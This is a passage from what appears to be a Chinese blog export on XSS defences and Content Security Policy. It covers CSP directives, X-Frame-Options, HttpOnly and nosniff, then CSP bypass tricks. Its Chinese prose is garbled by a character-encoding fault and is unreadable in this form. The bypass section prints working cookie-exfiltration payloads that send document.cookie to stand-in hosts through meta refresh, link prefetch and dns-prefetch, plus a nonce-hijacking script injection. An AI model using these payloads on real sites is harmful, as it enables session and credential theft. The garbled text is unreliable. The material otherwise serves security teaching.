å¤´ä¿¡æ¯æˆ–è€… meta å…ƒç´ å®šä¹‰ã€‚\nCSP å¹¶ä¸æ˜¯ç”¨æ¥é˜²æ­¢ xss æ”»å‡»çš„ï¼Œè€Œæ˜¯æœ€å°åŒ– xss å‘ç”Ÿåæ‰€é€ æˆçš„ä¼¤å®³ã€‚å®é™…ä¸Š, é™¤äº†å¼€å‘è€…è‡ªå·±åšå¥½ xss è½¬ä¹‰, å¹¶æ²¡æœ‰åˆ«çš„æ–¹æ³•å¯ä»¥é˜²æ­¢ xss çš„å‘ç”Ÿ. CSP å¯ä»¥è¯´æ˜¯ HTML5 ç»™webå®‰å…¨å¸¦æ¥çš„æœ€å®æƒ çš„ä¸œè¥¿ã€‚é‚£ä¹ˆå¦‚ä½•å¼•å…¥ CSP å‘¢ï¼Ÿ\n  é€šè¿‡å“åº”å¤´\nåªå…è®¸è„šæœ¬ä»æœ¬æºåŠ è½½Content-Security-Policy: script-src 'self'\n  é€šè¿‡ HTML çš„ META æ ‡ç­¾\n\u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src \u0026#39;self\u0026#39;\u0026#34;\u0026gt;   é‚£ä¹ˆ CSP é™¤äº†é™åˆ¶ script-src ä¹‹å¤–è¿˜èƒ½é™åˆ¶ä»€ä¹ˆå‘¢ï¼Ÿ\n base-uri : é™åˆ¶è¿™ç¯‡æ–‡æ¡£çš„uri child-src ï¼šé™åˆ¶å­çª—å£çš„æº(iframe,å¼¹çª—ç­‰),å–ä»£ frame-src connect-src ï¼šé™åˆ¶è„šæœ¬å¯ä»¥è®¿é—®çš„æº font-src : é™åˆ¶å­—ä½“çš„æº form-action : é™åˆ¶è¡¨å•èƒ½å¤Ÿæäº¤åˆ°çš„æº frame-ancestors : é™åˆ¶äº†å½“å‰é¡µé¢å¯ä»¥è¢«å“ªäº›é¡µé¢ä»¥iframe,frame,objectç­‰æ–¹å¼åŠ è½½ frame-src ï¼šdeprecated with child-src,é™åˆ¶äº†å½“å‰é¡µé¢å¯ä»¥åŠ è½½å“ªäº›æºï¼Œä¸frame-ancestorså¯¹åº” img-src : é™åˆ¶å›¾ç‰‡å¯ä»¥ä»å“ªäº›æºåŠ è½½ media-src : é™åˆ¶video, audio, source, track èƒ½å¤Ÿä»å“ªäº›æºåŠ è½½ object-src ï¼šé™åˆ¶æ’ä»¶å¯ä»¥ä»å“ªäº›æºåŠ è½½ sandbox ï¼šå¼ºåˆ¶æ‰“å¼€æ²™ç›’æ¨¡å¼  å¦å¤–ï¼ŒCSP è¿˜æä¾›ä¸€ä¸ªæŠ¥å‘Šçš„å¤´åŸŸ Content-Security-Policy-Report-Onlyï¼Œä½¿ç”¨è¿™ä¸ªå¤´åŸŸï¼Œæµè§ˆå™¨ä¼šå‘æœåŠ¡å™¨æŠ¥å‘Š csp çŠ¶æ€ã€‚\nContent-Security-Policy-Report-Only: script-src 'self'; report-uri http://cspReport/ ä½¿ç”¨äº†ä¸Šé¢çš„è®¾ç½®, è‹¥é¡µé¢ä¸Šå­˜åœ¨å†…è”çš„ jsï¼Œå®ƒä¾ç„¶ä¼šæ‰§è¡Œï¼Œä¸è¿‡æµè§ˆå™¨ä¼šå‘å‘é€ä¸€ä¸ª post è¯·æ±‚ï¼ŒåŒ…å«å¦‚ä¸‹ä¿¡æ¯ï¼š\n{ \u0026#34;csp-report\u0026#34;:{ \u0026#34;document-uri\u0026#34;: \u0026#34;http://cspReport/test.php\u0026#34;, \u0026#34;referrer\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;violated-directive\u0026#34;: \u0026#34;script-src \u0026#39;self\u0026#39;\u0026#34;, \u0026#34;original-policy\u0026#34;: \u0026#34;script-src \u0026#39;self\u0026#39;; report-uri http://cspReport/\u0026#34;, \u0026#34;blocked-uri\u0026#34;: \u0026#34;\u0026#34; } } CSP ç›®å‰æœ‰ä¸¤ç‰ˆ, [CSP1][] å’Œ [CSP2][]. ä¸¤ç‰ˆçš„æ”¯æŒçŠ¶æ€å¯ä»¥åœ¨ http://caniuse.com/#search=csp ä¸­æŸ¥åˆ°. å¦‚ä¸‹:\nCSP 1.0:\n \nCSP 2.0:\n \nX-Frame-Options  â€‹\tX-Frame-Options æœ‰ä¸‰ä¸ªå€¼:\n  DENY\nè¡¨ç¤ºè¯¥é¡µé¢ä¸å…è®¸åœ¨ frame ä¸­å±•ç¤ºï¼Œå³ä¾¿æ˜¯åœ¨ç›¸åŒåŸŸåçš„é¡µé¢ä¸­åµŒå¥—ä¹Ÿä¸å…è®¸ã€‚\n  SAMEORIGIN\nè¡¨ç¤ºè¯¥é¡µé¢å¯ä»¥åœ¨ç›¸åŒåŸŸåé¡µé¢çš„ frame ä¸­å±•ç¤ºã€‚\n  ALLOW-FROM *uri*\nè¡¨ç¤ºè¯¥é¡µé¢å¯ä»¥åœ¨æŒ‡å®šæ¥æºçš„ frame ä¸­å±•ç¤ºã€‚\n   X-Frame-Options å“åº”å¤´æ˜¯ç”¨æ¥ç»™æµè§ˆå™¨æŒ‡ç¤ºå…è®¸ä¸€ä¸ªé¡µé¢å¯å¦åœ¨ frame, iframe æˆ–è€… object ç­‰æ ‡ç­¾ä¸­å±•ç°çš„æ ‡è®°. ç½‘ç«™å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½, æ¥ç¡®ä¿è‡ªå·±ç½‘ç«™çš„å†…å®¹æ²¡æœ‰è¢«åµŒåˆ°åˆ«äººçš„ç½‘ç«™ä¸­å», ä¹Ÿä»è€Œé¿å…äº†ç‚¹å‡»åŠ«æŒ (clickjacking) çš„æ”»å‡». ä½†ä»¥åå¯èƒ½è¢«CSPçš„ frame-ancestorså–ä»£ã€‚ç›®å‰æ”¯æŒçš„çŠ¶æ€æ¯”èµ· CSP frame-ancestorsè¦å¥½ã€‚\nHttpOnly å½“ Cookie åœ¨æ¶ˆæ¯å¤´ä¸­è¢«è®¾ç½®ä¸º HttpOnly æ—¶ï¼Œè¿™æ ·æ”¯æŒ Cookie çš„æµè§ˆå™¨å°†é˜»æ­¢å®¢æˆ·ç«¯ Javascript ç›´æ¥è®¿é—®æµè§ˆå™¨ä¸­çš„ cookies ï¼Œä»è€Œè¾¾åˆ°ä¿æŠ¤æ•æ„Ÿæ•°æ®çš„ä½œç”¨ã€‚\nX-Content-Type-Options  â€‹\tX-Content-Type-Options: nosniff\nnosniff\nâ€‹\tå‡å¦‚è¯·æ±‚ç±»å‹ä¸ºä»¥ä¸‹ä¸¤ç§ï¼Œé‚£ä¹ˆé˜»æ­¢è¯·æ±‚çš„å‘ç”Ÿï¼š\n \u0026ldquo;style\u0026rdquo; ä½†æ˜¯ MIME ç±»å‹ä¸æ˜¯ \u0026ldquo;text/css\u0026quot;ï¼Œ \u0026ldquo;script\u0026rdquo; ä½†æ˜¯ MIME ç±»å‹ä¸æ˜¯ JavaScript MIME ç±»å‹ã€‚   X-Content-Type-Options å“åº”é¦–éƒ¨ç›¸å½“äºä¸€ä¸ªæç¤ºæ ‡å¿—ï¼Œè¢«æœåŠ¡å™¨ç”¨æ¥æç¤ºå®¢æˆ·ç«¯ä¸€å®šè¦éµå¾ªåœ¨ Content-Type é¦–éƒ¨ä¸­å¯¹ MIME ç±»å‹ çš„è®¾å®šï¼Œè€Œä¸èƒ½å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚è¿™å°±ç¦ç”¨äº†å®¢æˆ·ç«¯çš„ MIME ç±»å‹å—…æ¢è¡Œä¸ºï¼Œæ¢å¥è¯è¯´ï¼Œä¹Ÿå°±æ˜¯æ„å‘³ç€ç½‘ç«™ç®¡ç†å‘˜ç¡®å®šè‡ªå·±çš„è®¾ç½®æ²¡æœ‰é—®é¢˜ã€‚\nReference é˜²å¾¡XSSçš„ä¸ƒæ¡åŸåˆ™\nxssæ”»é˜²æµ…è°ˆ\n","date":"2019-03-14T15:11:58Z","permalink":"https://blog.zeddyu.info/2019/03/14/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-IV/","title":"Webå®‰å…¨ä»é›¶å¼€å§‹ XSS IV"},{"content":"è¿™æ˜¯è‡ªå·±å†™çš„ Web å®‰å…¨ä»é›¶å¼€å§‹ç³»åˆ—ä¹‹ XSS ç¯‡ã€‚ç¬¬ä¸‰ç¯‡è®²è§£ CSP ä¸ XSS\n[TOC]\nCSP(Content Security Policy) ä»‹ç» CSP å…¨ç§°ä¸º Content Security Policyï¼Œå³å†…å®¹å®‰å…¨ç­–ç•¥ã€‚ä¸»è¦ä»¥ç™½åå•çš„å½¢å¼é…ç½®å¯ä¿¡ä»»çš„å†…å®¹æ¥æºï¼Œåœ¨ç½‘é¡µä¸­ï¼Œèƒ½å¤Ÿä½¿ç™½åå•ä¸­çš„å†…å®¹æ­£å¸¸æ‰§è¡Œï¼ˆåŒ…å« JSï¼ŒCSSï¼ŒImage ç­‰ç­‰ï¼‰ï¼Œè€Œéç™½åå•çš„å†…å®¹æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œä»è€Œå‡å°‘è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œå½“ç„¶ï¼Œä¹Ÿèƒ½å¤Ÿå‡å°‘è¿è¥å•†åŠ«æŒçš„å†…å®¹æ³¨å…¥æ”»å‡»ã€‚\nä¸ºä½¿CSPå¯ç”¨, ä½ éœ€è¦é…ç½®ä½ çš„ç½‘ç»œæœåŠ¡å™¨è¿”å› Content-Security-Policy HTTPå¤´éƒ¨ ( æœ‰æ—¶ä½ ä¼šçœ‹åˆ°ä¸€äº›å…³äºX-Content-Security-Policyå¤´éƒ¨çš„ææ³•, é‚£æ˜¯æ—§ç‰ˆæœ¬ï¼Œä½ æ— é¡»å†å¦‚æ­¤æŒ‡å®šå®ƒ)ã€‚\né™¤æ­¤ä¹‹å¤–, \u0026lt;meta\u0026gt;å…ƒç´ ä¹Ÿå¯ä»¥è¢«ç”¨æ¥é…ç½®è¯¥ç­–ç•¥, ä¾‹å¦‚\n\u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39;; img-src https://*; child-src \u0026#39;none\u0026#39;;\u0026#34;\u0026gt; è¯­æ³•ç»„æˆ ç­–ç•¥ç»„æˆ CSP æœ‰ä¸¤ç§ç­–ç•¥ç±»å‹ï¼š\n Content-Security-Policy Content-Security-Policy-Report-Only  è¿™ä¸¤ç§ç­–ç•¥ç±»å‹çš„ä¸»è¦åŒºåˆ«ä¹Ÿå¯ä»¥ä»å‘½åä¸Šçœ‹å‡ºï¼Œç¬¬ä¸€ç§å¯¹ä¸å®‰å…¨çš„èµ„æºä¼šè¿›è¡Œé˜»æ­¢æ‰§è¡Œï¼Œè€Œç¬¬äºŒç§åªä¼šè¿›è¡Œæ•°æ®ä¸ŠæŠ¥ï¼Œä¸ä¼šæœ‰å®é™…çš„é˜»æ­¢ã€‚ å½“å®šä¹‰å¤šä¸ªç­–ç•¥çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šä¼˜å…ˆé‡‡ç”¨æœ€å…ˆå®šä¹‰çš„ã€‚\næŒ‡ä»¤é›†åˆ CSP çš„æŒ‡ä»¤æ˜¯ç»„æˆå†…å®¹æ¥æºç™½åå•çš„å…³é”®ï¼Œä¸Šé¢ä¸¤ç§ç­–ç•¥ç±»å‹å«æœ‰ä»¥ä¸‹ä¼—å¤šæŒ‡ä»¤ï¼Œå¯ä»¥é€šè¿‡æ­é…å¾—åˆ°æ»¡è¶³ç½‘ç«™èµ„æºæ¥æºçš„ç™½åå•ã€‚\næŒ‡ä»¤ç¤ºä¾‹åŠè¯´æ˜    æŒ‡ä»¤ å–å€¼ç¤ºä¾‹ è¯´æ˜     default-src \u0026lsquo;self\u0026rsquo; cdn.example.com å®šä¹‰é’ˆå¯¹æ‰€æœ‰ç±»å‹ï¼ˆjs/image/css/web font/ajax/iframe/å¤šåª’ä½“ç­‰ï¼‰èµ„æºçš„é»˜è®¤åŠ è½½ç­–ç•¥ï¼ŒæŸç±»å‹èµ„æºå¦‚æœæ²¡æœ‰å•ç‹¬å®šä¹‰ç­–ç•¥ï¼Œå°±ä½¿ç”¨é»˜è®¤ã€‚   script-src \u0026lsquo;self\u0026rsquo; js.example.com å®šä¹‰é’ˆå¯¹JavaScriptçš„åŠ è½½ç­–ç•¥   object-src \u0026lsquo;self\u0026rsquo; é’ˆå¯¹\u0026lt;object\u0026gt;/\u0026lt;embed\u0026gt;/\u0026lt;applet\u0026gt;ç­‰æ ‡ç­¾çš„åŠ è½½ç­–ç•¥   style-src \u0026lsquo;self\u0026rsquo; css.example.com å®šä¹‰é’ˆå¯¹æ ·å¼çš„åŠ è½½ç­–ç•¥   img-src \u0026lsquo;self\u0026rsquo; image.example.com å®šä¹‰é’ˆå¯¹å›¾ç‰‡çš„åŠ è½½ç­–ç•¥   media-src \u0026lsquo;media.example.com\u0026rsquo; é’ˆå¯¹æˆ–è€…å¼•å…¥çš„htmlå¤šåª’ä½“ç­‰æ ‡ç­¾çš„åŠ è½½ç­–ç•¥   frame-src \u0026lsquo;self\u0026rsquo; é’ˆå¯¹iframeçš„åŠ è½½ç­–ç•¥   connect-src \u0026lsquo;self\u0026rsquo; é’ˆå¯¹Ajaxã€WebSocketç­‰è¯·æ±‚çš„åŠ è½½ç­–ç•¥ã€‚ä¸å…è®¸çš„æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šæ¨¡æ‹Ÿä¸€ä¸ªçŠ¶æ€ä¸º400çš„å“åº”   font-src font.qq.com é’ˆå¯¹Web Fontçš„åŠ è½½ç­–ç•¥   sandbox allow-forms allow-scripts å¯¹è¯·æ±‚çš„èµ„æºå¯ç”¨sandbox   report-uri /some-report-uri å‘Šè¯‰æµè§ˆå™¨å¦‚æœè¯·æ±‚çš„èµ„æºä¸è¢«ç­–ç•¥å…è®¸æ—¶ï¼Œå¾€å“ªä¸ªåœ°å€æäº¤æ—¥å¿—ä¿¡æ¯ã€‚ä¸é˜»æ­¢ä»»ä½•å†…å®¹ï¼Œå¯ä»¥æ”¹ç”¨Content-Security-Policy-Report-Onlyå¤´   base-uri \u0026lsquo;self\u0026rsquo; é™åˆ¶å½“å‰é¡µé¢çš„urlï¼ˆCSP2ï¼‰   child-src \u0026lsquo;self\u0026rsquo; é™åˆ¶å­çª—å£çš„æº(iframeã€å¼¹çª—ç­‰),å–ä»£frame-srcï¼ˆCSP2ï¼‰   form-action \u0026lsquo;self\u0026rsquo; é™åˆ¶è¡¨å•èƒ½å¤Ÿæäº¤åˆ°çš„æºï¼ˆCSP2ï¼‰   frame-ancestors \u0026lsquo;none\u0026rsquo; é™åˆ¶äº†å½“å‰é¡µé¢å¯ä»¥è¢«å“ªäº›é¡µé¢ä»¥iframe,frame,objectç­‰æ–¹å¼åŠ è½½ï¼ˆCSP2ï¼‰   plugin-types application/pdf é™åˆ¶æ’ä»¶çš„ç±»å‹ï¼ˆCSP2ï¼‰    æŒ‡ä»¤å€¼ç¤ºä¾‹åŠè¯´æ˜    æŒ‡ä»¤å€¼ ç¤ºä¾‹ è¯´æ˜     * img-src * å…è®¸ä»»ä½•å†…å®¹   \u0026lsquo;none\u0026rsquo; img-src \u0026lsquo;none\u0026rsquo; ä¸å…è®¸ä»»ä½•å†…å®¹   \u0026lsquo;self\u0026rsquo; img-src \u0026lsquo;self\u0026rsquo; å…è®¸åŒæºå†…å®¹   data: img-src data: å…è®¸data:åè®®ï¼ˆå¦‚base64ç¼–ç çš„å›¾ç‰‡ï¼‰   www.a.com img-src www.a.com å…è®¸åŠ è½½æŒ‡å®šåŸŸåçš„èµ„æº   *.a.com img-src *.a.com å…è®¸åŠ è½½a.comä»»ä½•å­åŸŸçš„èµ„æº   https://img.com img-src https://img.com å…è®¸åŠ è½½img.comçš„httpsèµ„æº   https: img-src https: å…è®¸åŠ è½½httpsèµ„æº   \u0026lsquo;unsafe-inline\u0026rsquo; script-src \u0026lsquo;unsafe-inline\u0026rsquo; å…è®¸åŠ è½½inlineèµ„æºï¼ˆstyleå±æ€§ï¼Œonclickï¼Œinline jså’Œinline cssç­‰ç­‰ï¼‰   \u0026lsquo;unsafe-eval\u0026rsquo; script-src \u0026lsquo;unsafe-eval\u0026rsquo; å…è®¸åŠ è½½åŠ¨æ€jsä»£ç ï¼Œä¾‹å¦‚eval()    script-srcæœ‰å‡ ä¸ªç‰¹æ€§ï¼š\n \u0026lsquo;unsafe-inline\u0026rsquo;ï¼šå…è®¸æ‰§è¡Œé¡µé¢å†…åµŒçš„\u0026amp;lt;script\u0026gt;æ ‡ç­¾å’Œäº‹ä»¶ç›‘å¬å‡½æ•° unsafe-evalï¼šå…è®¸å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ‰§è¡Œï¼Œæ¯”å¦‚ä½¿ç”¨evalã€setTimeoutã€setIntervalå’ŒFunctionç­‰å‡½æ•°ã€‚ nonceå€¼ï¼šæ¯æ¬¡HTTPå›åº”ç»™å‡ºä¸€ä¸ªæˆæƒtokenï¼Œé¡µé¢å†…åµŒè„šæœ¬å¿…é¡»æœ‰è¿™ä¸ªtokenï¼Œæ‰ä¼šæ‰§è¡Œ hashå€¼ï¼šåˆ—å‡ºå…è®¸æ‰§è¡Œçš„è„šæœ¬ä»£ç çš„Hashå€¼ï¼Œé¡µé¢å†…åµŒè„šæœ¬çš„å“ˆå¸Œå€¼åªæœ‰å»åˆçš„æƒ…å†µä¸‹ï¼Œæ‰èƒ½æ‰§è¡Œã€‚  é¡µé¢å†…åµŒè„šæœ¬ï¼Œå¿…é¡»æœ‰è¿™ä¸ªtokenæ‰èƒ½æ‰§è¡Œã€‚\n\u0026lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa\u0026gt; // some code \u0026lt;/script\u0026gt; hashå€¼çš„ä¾‹å­å¦‚ä¸‹ï¼ŒæœåŠ¡å™¨ç»™å‡ºä¸€ä¸ªå…è®¸æ‰§è¡Œçš„ä»£ç çš„hashå€¼ã€‚\nContent-Security-Policy: script-src \u0026#39;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=\u0026#39; ä¸‹é¢çš„ä»£ç å°±ä¼šå…è®¸æ‰§è¡Œï¼Œå› ä¸ºhashå€¼ç›¸ç¬¦ã€‚\n\u0026lt;script\u0026gt;alert(\u0026#39;Hello, world.\u0026#39;);\u0026lt;/script\u0026gt; è¿™é‡Œå¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤å¾—åˆ°è¿™æ®µ hash\n$ echo -n \u0026#34;alert(\u0026#39;Hello, world.\u0026#39;);\u0026#34; | openssl dgst -binary -sha256 | openssl base64 qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng= ä½¿ç”¨æ–¹å¼ HTML Meta æ ‡ç­¾ åœ¨è¿™ç§å½¢å¼ä¸­ï¼ŒMeta æ ‡ç­¾ä¸»è¦å«æœ‰ä¸¤éƒ¨åˆ†çš„ key-valueï¼š\n http-equiv content  http-equiv çš„ value ä¸º CSP çš„ç­–ç•¥ç±»å‹ï¼Œè€Œ content åˆ™æ˜¯å£°æ˜æŒ‡ä»¤é›†åˆï¼Œå³ç™½åå•ã€‚å¦‚\n\u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src \u0026#39;self\u0026#39;\u0026#34;\u0026gt; åœ¨HTML çš„ head ä¸­ æ·»åŠ ä¸Šé¢çš„ Meta æ ‡ç­¾ï¼Œé‚£ä¹ˆå½“æµè§ˆå™¨æ”¯æŒ CSP æ ‡å‡†æ—¶ï¼Œç”±äºä½¿ç”¨çš„æ˜¯ Content-Security-Policy å®é™…é˜»æ­¢çš„ç­–ç•¥ï¼Œæ‰€ä»¥å°†ä¼šä½¿å¾—éåŒæºçš„ scriptï¼ˆæ ¹æ®æŒ‡ä»¤é›†åˆæ¥å®šï¼‰ä¸ä¼šè¢«åŠ è½½åŠæ‰§è¡Œã€‚\nMeta æ ‡ç­¾çš„ Content-Security-Policy-Report-Only æ–¹å¼åœ¨å½“å‰ï¼ˆ2016/5/19ï¼‰å¤šæ•°ç§»åŠ¨ç«¯æµè§ˆå™¨ä¸Šè¡¨ç°æ­£å¸¸ï¼Œä½†æ˜¯ ä¸æ¨è è¿™æ ·åšï¼Œå¦‚ chrome 50 ä¼šäº§ç”Ÿå¦‚ä¸‹çš„æç¤º\n The report-only Content Security Policy xxxxxxx was delivered via a element,which is disallowed. The policy has been ignored.\n HTTP Header é€šè¿‡ Meta çš„æ–¹å¼å¾ˆæ˜¯ç®€å•ï¼Œä½†å½“æ¶‰åŠåˆ°çš„é¡µé¢è¾ƒå¤šæ—¶ï¼Œä½¿ç”¨ Meta æ ‡ç­¾çš„æ–¹å¼éœ€è¦åœ¨æ¯ä¸ªé¡µé¢éƒ½å„è‡ªåŠ ä¸Šã€‚è€Œå¦‚æœé€šè¿‡æœåŠ¡ç«¯é…ç½® HTML è¿”å›çš„å“åº”å¤´ HTTP header å¸¦ä¸Š CSP çš„æŒ‡ä»¤çš„è¯ï¼Œé‚£å°†èƒ½å¤Ÿä¸€åŠ³æ°¸é€¸ï¼ŒåŒæ—¶æ”¯æŒå¤šä¸ªé¡µé¢ã€‚ä¸‹å›¾ä¸ºå“åº”å¤´\n http \nä¸ä»…å¦‚æ­¤ï¼Œè¿™ç§å½¢å¼çš„ Content-Security-Policy-Report-Only æ–¹å¼èƒ½å¤Ÿå¾—åˆ°æ›´å¥½çš„å…¼å®¹æ”¯æŒï¼Œä¹Ÿæ˜¯æ¨èæ–¹å¼ã€‚\nç»•è¿‡æ–¹å¼ å»ºè®®å‚è€ƒCSP Level 3æµ…æ\u0026amp;ç®€å•çš„bypassï¼Œè¿™é‡Œæˆ‘ä»¬ç®€è¿°å‡ ç§æƒ…å†µä¸‹çš„ç»•è¿‡æ–¹å¼\nurl è·³è½¬ åœ¨default-src 'none'çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨\u0026lt;meta\u0026gt;æ ‡ç­¾å®ç°è·³è½¬\n\u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;1;url=http://www.xss.com/x.php?c=[cookie]\u0026#34; \u0026gt; åœ¨å…è®¸unsafe-inlineçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨window.locationï¼Œæˆ–è€…window.openä¹‹ç±»çš„æ–¹æ³•è¿›è¡Œè·³è½¬ç»•è¿‡ã€‚\n\u0026lt;link\u0026gt;æ ‡ç­¾é¢„åŠ è½½ prefetch CSPå¯¹linkæ ‡ç­¾çš„é¢„åŠ è½½åŠŸèƒ½è€ƒè™‘ä¸å®Œå–„ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡ link æ ‡ç­¾æ¥å®ç°é¢„åŠ è½½çš„æŒ‡ä»¤\nåœ¨ Chrome ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ ‡ç­¾å‘é€ cookieï¼ˆæœ€æ–°ç‰ˆChromeä¼šç¦æ­¢ï¼‰\n\u0026lt;link rel=\u0026#34;prefetch\u0026#34; href=\u0026#34;http://www.xss.com/x.php?c=[cookie]\u0026#34;\u0026gt; è™½ç„¶åœ¨æ ‡ç­¾å†…ä¸èƒ½æ‹¿ cookie ï¼Œä½†æ˜¯å¦‚æœå¯ä»¥æ‰§è¡Œå†…è” js çš„è¯ï¼Œæƒ…å†µå°±ä¸ä¸€æ ·äº†\nContent-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; å¦‚æœå¤´åƒä¸Šé¢é‚£æ ·çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹ payload\n\u0026lt;script\u0026gt; var i=document.createElement(\u0026#39;link\u0026#39;); i.setAttribute(\u0026#39;rel\u0026#39;,\u0026#39;prefetch\u0026#39;); i.setAttribute(\u0026#39;href\u0026#39;,\u0026#39;http://xxx.com?\u0026#39;+document.cookie); document.head.appendChild(i);\t\u0026lt;/script\u0026gt; dns-prefetch åœ¨ Firefox ä¸‹ï¼Œå¯ä»¥å°† cookie ä½œä¸ºå­åŸŸåï¼Œç”¨ dns é¢„è§£æçš„æ–¹å¼æŠŠ cookie å¸¦å‡ºå»ï¼ŒæŸ¥çœ‹dnsæœåŠ¡å™¨çš„æ—¥å¿—å°±èƒ½å¾—åˆ° cookie\n\u0026lt;link rel=\u0026#34;dns-prefetch\u0026#34; href=\u0026#34;//[cookie].xxx.ceye.io\u0026#34;\u0026gt; åŒæ ·æƒ³è¦åœ¨\nContent-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; è¿™ç§æƒ…å†µä¸‹æ”¶è· Cookie çš„è¯\n\u0026lt;script\u0026gt; dcl = document.cookie.split(\u0026#34;;\u0026#34;); n0 = document.getElementsByTagName(\u0026#34;HEAD\u0026#34;)[0]; for (var i=0; i\u0026lt;dcl.length;i++) { console.log(dcl[i]); n0.innerHTML = n0.innerHTML + \u0026#34;\u0026lt;link rel=\\\u0026#34;dns-prefetch\\\u0026#34; href=\\\u0026#34;//\u0026#34; + escape(dcl[i].replace(/\\//g, \u0026#34;-\u0026#34;)).replace(/%/g, \u0026#34;_\u0026#34;) + \u0026#39;.\u0026#39; + location.hostname.replace(/\\./g, \u0026#34;-\u0026#34;) + \u0026#34;.xxxx.ceye.io\\\u0026#34;\u0026gt;\u0026#34;; } \u0026lt;/script\u0026gt; å› ä¸ºåŸŸåçš„å‘½åè§„åˆ™æ˜¯ [.-a-zA-Z0-9]+ï¼Œæ‰€ä»¥éœ€è¦å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦è¿›è¡Œæ›¿æ¢\npreconnect preconnect(é¢„è¿æ¥)ï¼Œä¸ DNSé¢„è§£æ ç±»ä¼¼ï¼Œä½†å®ƒä¸ä»…å®Œæˆ DNS é¢„è§£æï¼Œè¿˜è¿›è¡Œ TCP æ¡æ‰‹å’Œ TLS åå•†\nåˆ©ç”¨æ–¹å¼å’Œä¸Šé¢ç±»ä¼¼\nåˆ©ç”¨æµè§ˆå™¨è¡¥å…¨ æœ‰äº›ç½‘ç«™é™åˆ¶åªæœ‰æŸäº›è„šæœ¬æ‰èƒ½ä½¿ç”¨ï¼Œå¾€å¾€ä¼šä½¿ç”¨\u0026lt;script\u0026gt;æ ‡ç­¾çš„ nonce å±æ€§ï¼Œåªæœ‰ nonce ä¸€è‡´çš„è„šæœ¬æ‰ç”Ÿæ•ˆï¼Œæ¯”å¦‚ CSP è®¾ç½®æˆä¸‹é¢è¿™æ ·ï¼š\nContent-Security-Policy: default-src 'none';script-src 'nonce-EDNnf03nceIOfn39fn3e9h3sdfa' é‚£ä¹ˆå½“è„šæœ¬æ’å…¥ç‚¹ä¸ºå¦‚ä¸‹çš„æƒ…å†µæ—¶\n\u0026lt;p\u0026gt;æ’å…¥ç‚¹\u0026lt;/p\u0026gt; \u0026lt;script id=\u0026#34;aa\u0026#34; nonce=\u0026#34;abc\u0026#34;\u0026gt;document.write(\u0026#39;CSP\u0026#39;);\u0026lt;/script\u0026gt; å¯ä»¥æ’å…¥\n\u0026lt;script src=//14.rs a=\u0026#34; è¿™æ ·ä¼šæ‹¼æˆä¸€ä¸ªæ–°çš„scriptæ ‡ç­¾ï¼Œå…¶ä¸­çš„srcå¯ä»¥è‡ªç”±è®¾å®š\n\u0026lt;p\u0026gt;\u0026lt;script src=//14.rs a=\u0026#34;\u0026lt;/p\u0026gt; \u0026lt;script id=\u0026#34;aa\u0026#34; nonce=\u0026#34;EDNnf03nceIOfn39fn3e9h3sdfa\u0026#34;\u0026gt;document.write(\u0026#39;CSP\u0026#39;);\u0026lt;/script\u0026gt; ä»£ç é‡ç”¨ ä¾‹å¦‚å‡è®¾é¡µé¢ä¸­ä½¿ç”¨äº† Jquery-mobile åº“ï¼Œå¹¶ä¸”CSPç­–ç•¥ä¸­åŒ…å«script-src 'unsafe-eval'æˆ–è€…script-src 'strict-dynamic'ï¼Œé‚£ä¹ˆä¸‹é¢çš„å‘é‡å°±å¯ä»¥ç»•è¿‡CSPï¼š\n\u0026lt;div data-role=popup id=\u0026#39;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; åœ¨è¿™ä¸ªPPTä¹‹å¤–çš„è¿˜æœ‰ä¸€äº›åº“ä¹Ÿå¯ä»¥è¢«åˆ©ç”¨ï¼Œä¾‹å¦‚RCTF2018ä¸­é‡åˆ°çš„ampåº“ï¼Œä¸‹é¢çš„æ ‡ç­¾å¯ä»¥è·å–åå­—ä¸ºFLAGçš„cookie\n\u0026lt;amp-pixel src=\u0026#34;http://your domain/?cid=CLIENT_ID(FLAG)\u0026#34;\u0026gt;\u0026lt;/amp-pixel\u0026gt; iframe å¦‚æœé¡µé¢Aä¸­æœ‰CSPé™åˆ¶ï¼Œä½†æ˜¯é¡µé¢Bä¸­æ²¡æœ‰ï¼ŒåŒæ—¶Aå’ŒBåŒæºï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨Aé¡µé¢ä¸­åŒ…å«Bé¡µé¢æ¥ç»•è¿‡CSPï¼š\n\u0026lt;iframe src=\u0026#34;B\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; åœ¨Chromeä¸‹ï¼Œiframeæ 